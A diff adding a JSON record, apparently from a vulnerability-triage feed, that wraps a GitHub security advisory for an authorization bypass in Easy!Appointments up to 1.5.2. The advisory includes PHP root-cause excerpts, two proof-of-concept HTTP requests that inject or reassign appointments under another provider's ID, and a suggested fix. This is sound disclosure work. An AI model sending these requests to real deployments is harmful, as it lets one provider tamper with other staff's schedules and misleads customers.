@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/75063323?v=4\", \"events_url\": \"https://api.github.com/users/ashrexon/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/ashrexon/followers\", \"following_url\": \"https://api.github.com/users/ashrexon/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/ashrexon/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/ashrexon\", \"id\": 75063323, \"login\": \"ashrexon\", \"node_id\": \"MDQ6VXNlcjc1MDYzMzIz\", \"organizations_url\": \"https://api.github.com/users/ashrexon/orgs\", \"received_events_url\": \"https://api.github.com/users/ashrexon/received_events\", \"repos_url\": \"https://api.github.com/users/ashrexon/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/ashrexon/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/ashrexon/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/ashrexon\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-52839\", \"cvss\": {\"score\": 3.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 3.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-639\", \"name\": \"Authorization Bypass Through User-Controlled Key\"}, {\"cwe_id\": \"CWE-862\", \"name\": \"Missing Authorization\"}], \"description\": \"## Summary\\n \\nEasy!Appointments correctly filters provider-scoped appointments in the `appointments/search` response, proving that provider isolation is an intended security boundary. However, the direct mutation endpoints `appointments/store` and `appointments/update` only check generic appointment privileges and never verify that the submitted `id_users_provider` belongs to the current session.\\n \\nA normal authenticated provider can inject new appointments into another provider's schedule via `store`, or reassign existing appointments into a foreign provider's calendar via `update`. The `store` path contains an additional write-before-crash bug: the unauthorized row is committed to the database before the controller crashes on a type error, so the attacker receives an error response while the foreign appointment is already persisted.\\n \\n---\\n \\n## Root Cause — Step by Step Code Flow\\n \\n### Step 1 — Search correctly enforces provider isolation\\nThe `search` endpoint filters out appointments belonging to other providers — proving provider isolation is an intended boundary:\\n \\n```php\\n// Appointments.php\\nif ($role_slug === DB_SLUG_PROVIDER) {\\n    foreach ($appointments as $index => $appointment) {\\n        if ((int) $appointment['id_users_provider'] !== (int) $user_id) {\\n            unset($appointments[$index]);\\n        }\\n    }\\n}\\n```\\n \\n### Step 2 — store() only checks generic add permission\\nThe store endpoint checks only whether the caller can add appointments in general — no provider ownership check:\\n \\n```php\\n// Appointments.php line 74-152\\nif (cannot('add', PRIV_APPOINTMENTS)) {\\n    abort(403, 'Forbidden');\\n}\\n \\n$appointment = json_decode(request('appointment'), true);\\n```\\n \\n### Step 3 — Attacker-controlled id_users_provider saved directly\\nThe controller whitelists and persists the appointment including the attacker-controlled provider ID:\\n \\n```php\\n$this->appointments_model->only($appointment, $this->allowed_appointment_fields);\\n$appointment_id = $this->appointments_model->save($appointment);\\n```\\n \\nNo check is performed to verify `id_users_provider` matches the current session.\\n \\n### Step 4 — Write-before-crash on store()\\nAfter the unauthorized row is committed, the controller crashes on a type error:\\n \\n```php\\n$appointment = $this->appointments_model->find($appointment); // array passed instead of $appointment_id\\n```\\n \\nThe attacker receives a 500 error response, but the foreign appointment row is already in the database.\\n \\n### Step 5 — update() has the same missing ownership check\\nThe update endpoint also accepts attacker-controlled `id_users_provider` with only a generic edit permission check:\\n \\n```php\\n// Appointments.php line 178-196\\nif (cannot('edit', PRIV_APPOINTMENTS)) {\\n    abort(403, 'Forbidden');\\n}\\n \\n$appointment = json_decode(request('appointment'), true);\\n$appointment_id = $this->appointments_model->save($appointment);\\n```\\n \\nA provider can reassign any appointment they can edit into a foreign provider's calendar.\\n \\n---\\n \\n## Proof of Concept\\n \\n**Attacker:** Provider with session ID `4`\\n**Target:** Foreign provider with ID `2`\\n \\n**Step 1 — Inject appointment into foreign provider's schedule:**\\n \\n```http\\nPOST /index.php/appointments/store HTTP/1.1\\nHost: 127.0.0.1:18094\\nCookie: <provider-4-session>\\nContent-Type: application/x-www-form-urlencoded\\n \\ncsrf_token=<token>&appointment={\\\"start_datetime\\\":\\\"2026-05-29 15:00:00\\\",\\\"end_datetime\\\":\\\"2026-05-29 15:30:00\\\",\\\"notes\\\":\\\"foreign provider create by alicer\\\",\\\"id_users_provider\\\":2,\\\"id_users_customer\\\":3,\\\"id_services\\\":1}\\n```\\n \\nResponse: `500 Internal Server Error` — type error on find()\\n \\n**But the row is committed:**\\n```\\nid  start_datetime        id_users_provider  notes\\n6   2026-05-29 15:00:00   2                  foreign provider create by alicer\\n```\\n \\nProvider 4 created a row that belongs to provider 2.\\n \\n---\\n \\n**Step 2 — Reassign existing appointment to foreign provider:**\\n \\n```http\\nPOST /index.php/appointments/update HTTP/1.1\\nHost: 127.0.0.1:18094\\nCookie: <provider-4-session>\\nContent-Type: application/x-www-form-urlencoded\\n \\ncsrf_token=<token>&appointment={\\\"id\\\":7,\\\"start_datetime\\\":\\\"2026-05-30 09:00:00\\\",\\\"end_datetime\\\":\\\"2026-05-30 09:30:00\\\",\\\"notes\\\":\\\"reassigned to provider 2 by alicer\\\",\\\"id_users_provider\\\":2,\\\"id_users_customer\\\":3,\\\"id_services\\\":1}\\n```\\n \\nResponse: `200 OK`\\n \\n**Result:** Appointment 7 now belongs to provider 2 instead of provider 4.\\n \\n**Runtime verification result:**\\n```\\nattacker provider id:                    4\\nforeign created appointment provider id: 2\\nreassigned appointment provider id:      2\\nprovider-visible appointments:           0\\nPASS\\n```\\n \\nThe attacker's appointment search returns 0 results because both proof appointments now belong to the foreign provider.\\n \\n---\\n \\n## Real World Impact\\n \\nIn a multi-provider Easy!Appointments deployment — a clinic, salon, or service business with multiple staff members — any authenticated provider can:\\n \\n- Inject fake appointments into a colleague's schedule causing confusion and double-bookings\\n- Move their own appointments into another provider's calendar to hide or offload them\\n- Disrupt scheduling integrity for staff and customers\\n- Create unauthorized appointments that customers and admins attribute to the wrong provider\\nThe write-before-crash bug in `store()` makes detection harder — the attacker receives an error response that may appear harmless while the unauthorized record is silently committed.\\n \\n---\\n \\n## Suggested Fix\\n \\n**In `store()` and `update()`:** Enforce that `id_users_provider` matches the current session provider ID for non-admin roles:\\n \\n```php\\nif ($role_slug === DB_SLUG_PROVIDER) {\\n    $appointment['id_users_provider'] = $user_id; // force own provider ID\\n}\\n```\\n \\n**Fix the write-before-crash bug in `store()`:**\\n \\n```php\\n$appointment_id = $this->appointments_model->save($appointment);\\n$appointment = $this->appointments_model->find($appointment_id); // use ID not array\\n```\\n \\n---\\n \\n## Reporter\\n**Yash Shendge (ashrexon)**\\n2026-05-25\", \"epss\": {\"percentage\": 0.00146, \"percentile\": 0.04224}, \"ghsa_id\": \"GHSA-w8xc-8g92-v77h\", \"github_reviewed_at\": \"2026-07-29T16:26:25Z\", \"html_url\": \"https://github.com/advisories/GHSA-w8xc-8g92-v77h\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-w8xc-8g92-v77h\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-52839\"}], \"nvd_published_at\": \"2026-07-14T16:17:00Z\", \"published_at\": \"2026-07-29T16:26:25Z\", \"references\": [\"https://github.com/alextselegidis/easyappointments/security/advisories/GHSA-w8xc-8g92-v77h\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-52839\", \"https://github.com/alextselegidis/easyappointments/commit/725eafa647308846ce887657db12771a829e42ef\", \"https://github.com/alextselegidis/easyappointments/releases/tag/1.6.0\", \"https://github.com/advisories/GHSA-w8xc-8g92-v77h\"], \"repository_advisory_url\": \"https://api.github.com/repos/alextselegidis/easyappointments/security-advisories/GHSA-w8xc-8g92-v77h\", \"severity\": \"low\", \"source_code_location\": \"https://github.com/alextselegidis/easyappointments\", \"summary\": \"Easy!Appointments appointments/store and appointments/update allow cross-provider appointment injection — Authorization Bypass\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-29T16:26:27Z\", \"url\": \"https://api.github.com/advisories/GHSA-w8xc-8g92-v77h\", \"vulnerabilities\": [{\"first_patched_version\": \"1.6.0\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"alextselegidis/easyappointments\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.5.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-w8xc-8g92-v77h",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "alextselegidis/easyappointments: <= 1.5.2"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-52839"
+    ],
+    "cvss_score": 3.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "alextselegidis/easyappointments"
+    ],
+    "remote": true,
+    "vendor_severity": "low"
+  },
+  "first_seen_at": "2026-07-29T19:35:56.288315Z",
+  "provenance": {
+    "content_sha256": "8568b89adebdf1f0785ebb222dc8473cc7c5b6dcf8da5bc3894fa61ee7dcf2aa",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-29T16:26:25Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-w8xc-8g92-v77h",
+  "status": "active",
+  "title": "Easy!Appointments appointments/store and appointments/update allow cross-provider appointment injection — Authorization Bypass",
+  "updated_at": "2026-07-29T16:26:27Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-w8xc-8g92-v77h"
+}
